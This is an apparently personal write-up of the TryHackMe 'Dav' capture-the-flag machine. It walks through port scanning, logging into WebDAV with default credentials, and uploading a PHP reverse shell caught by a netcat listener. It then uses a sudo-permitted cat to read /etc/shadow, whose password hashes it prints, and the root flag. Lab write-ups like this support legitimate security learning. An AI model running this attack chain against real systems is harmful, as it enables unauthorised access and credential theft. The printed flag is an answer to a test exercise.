@@ -1,0 +1,185 @@
+DAV CTF tryhackme
+
+Hey guys lets try to hack into this machine...
+First of all we will scan the ports.The command that I use to scan the ports:
+
+-> nmap -A -T4 10.10.94.248
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/17%OT=80%CT=1%CU=37338%PV=Y%DS=2%DC=T%G=Y%TM=5F63771
+OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ
+OS:(SP=107%GCD=1%ISR=109%TI=Z%CI=I%TS=8)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O
+OS:3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=
+OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSN
+OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 111/tcp)
+HOP RTT       ADDRESS
+1   141.85 ms 10.9.0.1
+2   142.01 ms 10.10.94.248
+
+So the port 80 is open and we can enumerate that port using nikto and search for files using dirb or gobuster.
+
+Unfortunately I got no results with nikto scan.
+
+lets try directory busting( I will be using dirb )
+
+-> dirb http://10.10.94.248
+
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://10.10.94.248
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Sep 17 20:18:56 2020
+URL_BASE: http://10.10.94.248/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.94.248/ --- 
++ http://10.10.94.248/index.html (CODE:200|SIZE:11321)
++ http://10.10.94.248/server-status (CODE:403|SIZE:300)                                                                               
++ http://10.10.94.248/webdav (CODE:401|SIZE:459)                                                                                      
+                                                                                                                                      
+-----------------
+END_TIME: Thu Sep 17 20:31:31 2020
+DOWNLOADED: 4612 - FOUND: 3
+
+Ok cool we got webdav which is also known as Web Distributed Authoring and Versioning which is used for remote authorising and stuffs.
+
+Got this webdav..Lets check this directory
+So it asked for browser credentials but we dont know any username and password.
+I tried default username and password like admin:admin & admin:password.
+
+Then I searched for Webdav default credentials and found this:
+
+    cadaver http://<REMOTE HOST>/webdav/
+    user: wampp
+    pass: xampp
+
+To install cadaver type:
+-> sudo apt-get install cadaver -y
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Dav# cadaver http://10.10.94.248/webdav/
+Authentication required for webdav on server `10.10.94.248':
+Username: wampp
+Password: 
+dav:/webdav/> ls
+Listing collection `/webdav/': succeeded.
+        passwd.dav                            44  Aug 26  2019
+dav:/webdav/> get passwd.dav
+Downloading `/webdav/passwd.dav' to passwd.dav:
+Progress: [=============================>] 100.0% of 44 bytes succeeded.
+dav:/webdav/> 
+
+So we can upload stuffs so I uploaded this php reverse shell from pentest monkey.
+
+dav:/webdav/> put /home/akshay/Desktop/Ignite/php-reverse-shell.php 
+Uploading /home/akshay/Desktop/Ignite/php-reverse-shell.php to `/webdav/php-reverse-shell.php':
+Progress: [=============================>] 100.0% of 5492 bytes succeeded.
+dav:/webdav/> 
+
+I will be setting up netcat listener at the following port:
+
+Go to the following url : http://IP/webdav/php-reverse-shell.php
+
+Ez bois we got a shell..
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Dav# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.94.248 34704
+Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 08:10:07 up 23 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+TO get a stable and proper shell we can use python
+
+python -c "import pty;pty.spawn('/bin/bash')"
+
+www-data@ubuntu:/$ id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ubuntu:/$ 
+
+Got user.txt in /home/merlin/user.txt
+
+www-data@ubuntu:/home/merlin: cat user.txt
+########################################
+
+www-data@ubuntu:/var/www/html/webdav$ sudo -l
+
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/cat
+
+
+Using cat we can read the shadow file as root or root files but we cant escalate the privileges with cat binary.
+So I will access the root files.
+As the root.txt lies in the /root/root.txt
+
+www-data@ubuntu:/var/www/html/webdav$ sudo /bin/cat /etc/shadow
+root:!:18134:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18134:0:99999:7:::
+uuidd:*:18134:0:99999:7:::
+merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1:18134:0:99999:7:::
+sshd:*:18134:0:99999:7:::
+wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKDv1FFxKsr/:18134:0:99999:7:::
+
+See its working :P ...
+
+
+www-data@ubuntu:/var/www/html/webdav$ sudo /bin/cat /root/root.txt
+101101ddc16b0cdf65ba0b8a7af7afa5
+www-data@ubuntu:/var/www/html/webdav$ 
+
+Voila Done with the machine.
+
+Happy Hacking..
+Thank you : )
